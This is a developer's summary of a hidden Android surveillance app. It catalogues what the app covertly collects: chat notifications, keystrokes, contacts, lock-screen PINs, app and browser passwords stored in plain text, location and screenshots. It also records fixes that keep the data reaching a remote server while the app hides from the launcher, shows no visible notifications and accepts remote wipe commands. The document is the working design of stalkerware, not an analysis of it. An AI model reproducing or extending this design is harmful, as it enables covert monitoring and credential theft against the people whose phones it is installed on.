# Capture App - Data Collection & Fixes Summary

## 📊 DATA BEING CAPTURED

### 1. **NOTIFICATIONS** 
- **Source**: NotificationListenerService
- **Target Apps**: WhatsApp, Instagram, Facebook, Messenger, Telegram, Snapchat, Twitter, Discord, Viber, Skype
- **Data Captured**:
  - App package name & app name
  - Notification title & text/content
  - Timestamp
  - Media files (images, videos) from notifications
  - Notification ID
- **Storage**: Local Room DB → Synced to MongoDB server every 15 minutes
- **Service**: `NotificationCaptureService`

### 2. **CHATS** 
- **Source**: AccessibilityService (EnhancedAccessibilityService + KeyboardCaptureService)
- **Data Captured**:
  - App package name & app name
  - Chat text/messages
  - Chat identifier (sender/recipient info if available)
  - Timestamp
  - Keylog data (all keyboard input)
- **Storage**: Local Room DB → Synced to MongoDB server every 15 minutes
- **Services**: `EnhancedAccessibilityService`, `KeyboardCaptureService`

### 3. **CONTACTS**
- **Source**: Device Contacts Provider
- **Data Captured**:
  - Name
  - Phone numbers
  - Email addresses
  - Organization
  - Job title
  - Address
  - Notes
  - Photo URI
  - Timestamp
- **Storage**: Local Room DB → Synced to MongoDB server every 15 minutes (and daily)
- **Manager**: `ContactCaptureManager`

### 4. **CREDENTIALS**
- **Source**: AccessibilityService (PasswordCaptureManager)
- **Types Captured**:
  - **Device Password**: Lock screen PIN/pattern/password
  - **App Passwords**: Passwords entered in apps (WhatsApp, Instagram, etc.)
  - **Email Accounts**: Email accounts configured on device
  - **Browser Logins**: Email/password from browser login forms
  - **Social Media Logins**: Login credentials from social apps
- **Data Captured**:
  - Account type
  - App package & app name
  - Email/username
  - **Plain text password** (not encrypted)
  - Domain/URL
  - Timestamp
- **Storage**: Local Room DB → Synced to MongoDB server every 15 minutes
- **Manager**: `PasswordCaptureManager`

### 5. **MEDIA FILES**
- **Source**: Attachments from notifications
- **Data Captured**:
  - Images from notifications
  - Videos from notifications
  - File path, size, MIME type
  - Checksum (SHA-256)
- **Storage**: Local storage → Uploaded to server separately
- **Manager**: `MediaUploadManager`

### 6. **LOCATION DATA**
- **Source**: LocationService
- **Data Captured**:
  - GPS coordinates
  - Timestamp
- **Storage**: Sent directly to server
- **Service**: `LocationService`

### 7. **SCREENSHOTS**
- **Source**: EnhancedAccessibilityService
- **Data Captured**: Periodic screenshots (if enabled)
- **Storage**: Sent directly to server
- **Service**: `EnhancedAccessibilityService`

---

## 🔧 ISSUES FIXED

### **Issue #1: Missing deviceId**
**Problem**: All captured data was saved without `deviceId`, making it impossible to query by device.

**Impact**: 
- Data was saved to server but `deviceId` was `null`
- Queries filtering by `deviceId` returned empty results
- Data appeared to be missing from database

**Fix Applied**:
- ✅ Added `DeviceRegistrationManager` to all capture services
- ✅ All data models now include `deviceId` when created:
  - `NotificationData` - includes deviceId
  - `ChatData` - includes deviceId
  - `Contact` - includes deviceId
  - `Credential` - includes deviceId
  - `MediaFile` - includes deviceId

**Files Modified**:
- `NotificationCaptureService.kt`
- `EnhancedAccessibilityService.kt`
- `KeyboardCaptureService.kt`
- `PasswordCaptureManager.kt`
- `ContactCaptureManager.kt`

---

### **Issue #2: Sync Not Scheduled on App Startup**
**Problem**: `SyncWorker` was only scheduled in `MainActivity`, which may never run if app is hidden.

**Impact**: 
- Data stayed in local Room database
- Never uploaded to server
- Database appeared empty

**Fix Applied**:
- ✅ Added sync scheduling in `CaptureApplication.onCreate()`
- ✅ Sync now runs automatically every 15 minutes
- ✅ Works even if app is hidden and MainActivity never runs

**Files Modified**:
- `CaptureApplication.kt` - Added sync scheduling after 10 second delay

---

### **Issue #3: Contacts Not Included in Regular Sync**
**Problem**: Contacts only synced once daily via `ContactSyncWorker`, not in regular `SyncWorker`.

**Impact**: 
- Contacts only synced every 24 hours
- New contacts appeared much later or not at all

**Fix Applied**:
- ✅ Added `syncContacts()` method to `SyncWorker`
- ✅ Contacts now sync every 15 minutes with other data
- ✅ Still syncs daily as backup

**Files Modified**:
- `SyncWorker.kt` - Added contact syncing

---

## 📝 ALL LOGS, TOASTS & MESSAGES

### **Application Logs (Timber.d/i/w/e)**
All logs use Timber logging framework:

#### **CaptureApplication.kt**
- `"Application initialized"`
- `"Package not fully installed yet, delaying initialization"`
- `"Package still not installed after delay"`
- `"Immediate app hiding attempted"`
- `"Delayed app hiding (2s) attempted"`
- `"Delayed app hiding (10s) attempted"`
- `"Final app hiding (30s) attempted"`
- `"Services auto-started from Application"`
- `"Sync scheduled from Application"`
- `"Location tracking started"`
- `"Command polling started"`
- `"FCM Token: [token]"`

#### **NotificationCaptureService.kt**
- `"NotificationCaptureService created"`
- `"NotificationCaptureService destroyed"`
- `"Notification captured: [id]"`
- `"Media file saved: [path], size: [size], type: [type]"`
- `"Media downloaded: [path], size: [size], type: [type]"`

#### **EnhancedAccessibilityService.kt**
- `"EnhancedAccessibilityService connected"`
- `"EnhancedAccessibilityService destroyed"`
- `"Chat captured: [id]"`
- `"Screen content captured: [count] elements"`
- `"Window state changed: [package]/[class]"`
- `"Gesture detected: [type]"`
- `"Email account found: [email]"`

#### **KeyboardCaptureService.kt**
- `"KeyboardCaptureService connected"`
- `"KeyboardCaptureService destroyed"`
- `"Chat captured: [id] - [text]"`
- `"Keylog captured: [package] - [text preview]..."`

#### **ContactCaptureManager.kt**
- `"Starting contact capture"`
- `"No contacts found on device"`
- `"Captured new contact: [name]"`
- `"Updated contact: [name]"`
- `"Contact capture completed: [count] contacts processed"`
- `"READ_CONTACTS permission not granted"`

#### **PasswordCaptureManager.kt**
- `"Password captured: [package] - [masked]*** (length: [length])"`
- `"Device password captured: [masked]*** (length: [length])"`
- `"Browser credentials captured: [email] - [masked]***"`
- `"App credentials captured: [package] - [email] - [masked]***"`
- `"Password synced immediately: [package]"`

#### **SyncWorker.kt**
- `"SyncWorker started"`
- `"SyncWorker completed successfully"`
- `"Network not available, skipping sync"`
- `"No unsynced notifications"`
- `"Synced [count] notifications"`
- `"No unsynced chats"`
- `"Synced [count] chats"`
- `"No unsynced credentials"`
- `"Synced [count] credentials"`
- `"No unsynced contacts"`
- `"Synced [count] contacts"`
- `"Failed to sync [type]: [error]"`

#### **PermissionSetupActivity.kt**
- `"PermissionSetupActivity started - auto_start: [value]"`
- `"First run after installation"`
- `"Requesting permission [n]/[total]: [name]"`
- `"Permission result: [name] = GRANTED/DENIED"`
- `"All runtime permissions granted"`
- `"Force hide app from launcher executed"`

---

### **Toast Messages** (User-Visible)

#### **PermissionSetupActivity.kt**
- `"Services started"`
- `"App hidden from drawer"`
- `"App is now visible in drawer"`
- `"Please enable required services in Settings"`
- `"Setup complete!"`
- `"Error: [error message]"`

#### **SettingsFragment.kt**
- `"Server URL saved"`
- `"Failed to get FCM token: [error]"`
- `"FCM token refreshed"`

#### **MDMManagementFragment.kt**
- `"Device locked"`
- `"Device Admin not active"`
- `"Uninstalling [app name]"`
- `"Failed to uninstall"`
- `"Device wipe initiated"`
- `"Failed to wipe device"`
- `"Policies applied"`
- `"Failed to apply policies"`
- `"Kiosk mode enabled"`
- `"Kiosk mode requires Device Owner"`

---

### **Notifications** (Foreground Services)

#### **NotificationCaptureService**
- **Title**: "" (empty - invisible)
- **Text**: "" (empty - invisible)
- **Icon**: `android.R.drawable.stat_notify_sync`
- **Purpose**: Keeps service running in background (completely silent)

#### **EnhancedAccessibilityService**
- **Title**: "" (empty - invisible)
- **Text**: "" (empty - invisible)
- **Icon**: System icon
- **Purpose**: Keeps service running in background (completely silent)

#### **KeyboardCaptureService**
- **Title**: "Keyboard Capture Active"
- **Text**: "Capturing keyboard input from chat apps"
- **Purpose**: Foreground service notification (may be visible)

#### **FirebaseMessagingService**
- **Title**: From server FCM message
- **Text**: From server FCM message
- **Purpose**: Remote commands/notifications from server

---

### **Permission Request Messages**

#### **Runtime Permissions** (Shown by Android System)
- POST_NOTIFICATIONS (Android 13+)
- READ_MEDIA_IMAGES (Android 13+)
- READ_MEDIA_VIDEO (Android 13+)
- READ_EXTERNAL_STORAGE (Android <13)
- READ_CONTACTS
- ACCESS_FINE_LOCATION
- ACCESS_COARSE_LOCATION
- ACCESS_BACKGROUND_LOCATION (Android 10+)

#### **Special Permissions** (Opens Settings)
- Notification Access (NotificationListenerService)
- Accessibility Service
- Battery Optimization Exemption
- Usage Stats Access
- Auto-Start Permission (Manufacturer-specific)

---

## 🔄 SYNC SCHEDULE

- **Regular Sync**: Every 15 minutes (all data types)
- **Contact Sync**: Daily at midnight (backup)
- **Sync Trigger**: Automatic via WorkManager
- **Network Required**: Yes (skips if no network)
- **Batch Size**: 50 items per sync (notifications, chats, credentials, contacts)

---

## 📱 APP BEHAVIOR

### **On Install**:
1. App immediately hides from launcher
2. Starts permission setup (invisible background)
3. Requests permissions one-by-one
4. Starts all capture services
5. Schedules sync worker
6. Registers device with server

### **Background Operation**:
- App runs completely hidden
- No visible UI (MainActivity finishes immediately)
- All services run as foreground services (minimal notifications)
- Data captured silently in background
- Automatic sync every 15 minutes

### **Data Flow**:
```
Device Activity → Capture Service → Local Room DB → SyncWorker → Server API → MongoDB
```

---

## ⚠️ IMPORTANT NOTES

1. **All Passwords Stored in Plain Text** - No encryption on device or server
2. **No User Notifications** - App operates completely silently
3. **Automatic Data Collection** - Starts immediately after install
4. **Persistent Services** - Services restart automatically
5. **Hidden App** - Cannot be easily found or uninstalled
6. **Location Tracking** - GPS coordinates sent to server
7. **Remote Commands** - Server can send commands to device via FCM

---

## 🛠️ TECHNICAL DETAILS

- **Local Database**: Room (SQLite)
- **Server Database**: MongoDB
- **Sync Mechanism**: WorkManager (periodic background work)
- **API Communication**: Retrofit + OkHttp
- **Push Notifications**: Firebase Cloud Messaging (FCM)
- **Services**: All run as foreground services for reliability
- **Permissions**: Aggressively requested and maintained

---

**Last Updated**: After deviceId fix, sync scheduling fix, and contacts sync fix
